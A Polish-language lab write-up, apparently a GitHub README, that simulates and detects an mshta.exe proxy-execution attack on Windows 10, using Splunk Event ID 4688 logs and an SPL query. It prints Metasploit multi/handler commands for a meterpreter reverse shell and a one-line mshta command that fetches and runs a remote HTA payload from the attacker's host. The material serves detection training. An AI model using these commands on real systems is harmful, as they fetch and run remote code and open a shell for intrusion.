# Case Study: Detekcja i Analiza Proxy Execution z Użyciem LOLBin (mshta.exe) w Środowisku Windows / Splunk Enterprise

## 1. Cel projektu
Celem tego projektu laboratoryjnego jest przeprowadzenie, zarejestrowanie oraz wykrycie zaawansowanego ataku typu **Living off the Land (LotL)** z wykorzystaniem natywnego, podpisanego cyfrowo narzędzia systemowego Windows – **`mshta.exe`** (Microsoft HTML Application Host).

Atak polega na zdalnym pobraniu i wykonaniu złośliwego skryptu HTA z serwera atakującego (Kali Linux), co pozwala na ominięcie podstawowych mechanizmów kontroli aplikacji oraz ukrycie złośliwej aktywności pod płaszczykiem legalnego procesu systemowego.

W ramach projektu skonfigurowałem odpowiednią telemetrię na stacji roboczej Windows 10, przesłałem logi do **Splunk Enterprise** za pomocą **Splunk Universal Forwarder**, przeprowadziłem symulację ataku oraz zaprojektowałem zapytanie SPL do detekcji zagrożenia.

## 2. MITRE ATT&CK Mapowanie

| ID Taktyki / Techniki | Nazwa Techniki | Opis w Kontekscie Scenariusza |
| :--- | :--- | :--- |
| **TA0005** (Defense Evasion) | **T1218.005** - Signed Binary Proxy Execution: Mshta | Wykorzystanie zaufanego, podpisanego przez Microsoft pliku `mshta.exe` do załadowania i wykonania kodu HTML/VBScript/PowerShell z pominięciem restrykcji. |
| **TA0002** (Execution) | **T1059.005** - Command and Scripting Interpreter: Visual Basic / JScript | Wykonanie złośliwego payloadu osadzonego wewnątrz struktury HTA za pomocą silnika skryptowego MSHTML. |
| **TA0011** (Command and Control) | **T1071.001** - Application Layer Protocol: Web Protocols | Nawiązanie połączenia zwrotnego (Reverse Shell) przez HTTP do stacji atakującego (Kali Linux). |

### Wyjaśnienie analityka:
`mshta.exe` to plik wykonywalny odpowiedzialny za uruchamianie plików `.hta`, które mogą zawierać osadzony kod skryptowy oraz komponenty ActiveX. Ponieważ plik jest natywnie obecny w systemie Windows i podpisany cyfrowo przez Microsoft, analitycy SOC często przeoczają jego nietypowe wywołania sieciowe. Przestępcy chętnie wykorzystują go do pobierania payloadów Stage-2 w pamięci (Memory-only execution), co utrudnia detekcję opartą na plikach dyskowych.

## 3. Metodologia ataku 

### Krok 1: Przygotowanie środowiska atakującego (Kali Linux)

<img width="665" height="813" alt="2" src="https://github.com/user-attachments/assets/1c81269f-99ca-4507-a2f6-771fdca407b9" />

Na stacji Kali Linux wygenerowałem złośliwy payload HTA zawierający kod PowerShell (reverse shell) oraz uruchomiłem lokalny serwer Apache (`apache2`) w celu dystrybucji pliku.

### Krok 2: Konfiguracja nasłuchu

<img width="669" height="539" alt="1" src="https://github.com/user-attachments/assets/e29447ea-0f48-4b52-b5c8-6e89705d72ef" />

Skonfigurowałem moduł multi/handler w konsoli Metasploit, aby oczekiwać na połączenie zwrotne od stacji roboczej Windows 10. 

Komendy Kali: 
```
sudo msfconsole -q
use exploit/multi/handler
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set LHOST 192.168.0.107
set LPORT 4444
exploit
```
### Krok 3: Egzekucja ataku na stacji Windows 10

<img width="681" height="511" alt="3" src="https://github.com/user-attachments/assets/e3c68df1-297b-4d4e-8ac1-339b8ddde1cb" />

Na stacji Windows 10 uruchomiłem atak poprzez wywołanie binarnego LOLBin w wierszu poleceń.

Komendy Windows 10
```
mshta.exe http://192.168.0.107/payload.hta
```

## 4. Analiza logów (Splunk / Windows Security)

Do wykrycia tego ataku w Splunk Enterprise wykorzystałem zdarzenia tworzenia procesów z włączonym pełnym audytem linii komend (Windows Security Event ID 4688).

Na co patrzeć w strumieniu JSON w Splunk:
-Event ID 4688 (Process Creation):
*    ```Nazwa nowego procesu```: Wskazuje na ```C:\Windows\System32\mshta.exe.```
*    ```Wiersz polecenia``` (CommandLine): Zawiera adres URL ```mshta.exe http://192.168.0.107/payload.hta```, co stanowi silny wskaźnik IOC (Indicator of Compromise).
*    ```Nazwa procesu twórcy``` (ParentProcessName): Proces nadrzędny to ```cmd.exe```.

Przykładowe zapytanie SPL (Splunk Processing Language) do detekcji:
 ```source="WinEventLog:Security" EventCode=4688 "mshta.exe" ```
